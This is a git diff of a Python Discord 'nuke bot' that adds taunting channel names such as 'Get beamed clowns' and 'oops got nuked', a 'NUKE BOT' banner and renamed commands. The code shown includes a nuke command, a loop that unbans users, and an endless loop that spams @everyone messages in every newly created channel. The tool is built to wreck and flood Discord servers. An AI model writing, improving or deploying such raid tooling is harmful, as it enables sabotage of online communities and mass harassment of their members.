@@ -5,46 +5,36 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "bot token"
+token = "𝐁𝐨𝐭_𝐓𝐨𝐤𝐞𝐧"
 
 
-SPAM_CHANNEL =  ["channel name you want it to spam"]
-SPAM_MESSAGE = ["@everyone the message you want it to spam"] 
+SPAM_CHANNEL =  ["𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 runs you" , "Get ran" , "𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞" , "oops Beamed","𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞 Beamed You","Shoulda Listened","Get beamed clowns","Beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","oops got nuked","I run you","beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞","I run you","kinda got beamed by 𝐘𝐨𝐮𝐫_𝐍𝐚𝐦𝐞"]
+SPAM_MESSAGE = ["@everyone 𝐒𝐩𝐚𝐦_𝐌𝐞𝐬𝐬𝐚𝐠𝐞"]
 
-
-client = commands.Bot(command_prefix="soviet.")
+client = commands.Bot(command_prefix="𝐏𝐫𝐞𝐟𝐢𝐱_𝐀𝐫𝐞𝐚")
 
 
 @client.event
 async def on_ready():
    print(''' 
- ⠀⠀⠀⠀⠀⠀⣦
-⠀⠀⠀⢤⣤⣼⣿⣦⣤⡤⠀⠀⠀⠀⠀⠀⠀⠐⢦⣄
-⠀⠀⠀⠀⢹⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀
-⠀⠀⠀⠀⠛⠉⠀⠉⠓⠀⠀⢀⣤⣤⣤⣴⣶⣦⠀⠀⠈⢻⣿⣦
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⢿⣿⣧
-⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣯⡀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣇
-⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡿⠿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⠈⠻⠋⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢸⣿⣿⣿
-⠀⠀⠀⠀⠀⠀⣀⣄⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣷⣄⣠⣿⣿⣿⡿
-⠀⠀⠀⢀⣠⣾⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠃
-⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⡇
-⠸⣿⣿⣿⣿⡿⠛⠁⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣦⡀
-⠀⠘⢿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠉⠉⠀⠀⠈⠻⣿⣿⣿⣿⡦
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠟⠋  
-
+   
+███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
+████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
+██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
+██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
+██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
+╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
  ''')
-   await client.change_presence(activity=discord.Game(name="your bots status")
-                                                
+   await client.change_presence(activity=discord.Game(name="𝐁𝐨𝐭_𝐒𝐭𝐚𝐭𝐮𝐬"))
 
 @client.command()
 @commands.is_owner()
-async def stop(ctx):
+async def 𝐁𝐨𝐭_𝐒𝐭𝐨𝐩(ctx):
     await ctx.bot.logout()
     print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
 
 @client.command()
-async def nuke(ctx):
+async def 𝐁𝐨𝐭_𝐍𝐮𝐤𝐞(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
@@ -81,7 +71,7 @@ async def nuke(ctx):
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
-        await user.unban("username")
+        await user.unban("𝐘𝐨𝐮𝐫_𝐔𝐬𝐞𝐫")
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
@@ -99,4 +89,5 @@ async def nuke(ctx):
 async def on_guild_channel_create(channel):
   while True:
     await channel.send(random.choice(SPAM_MESSAGE))
+
 client.run(token, bot=True)
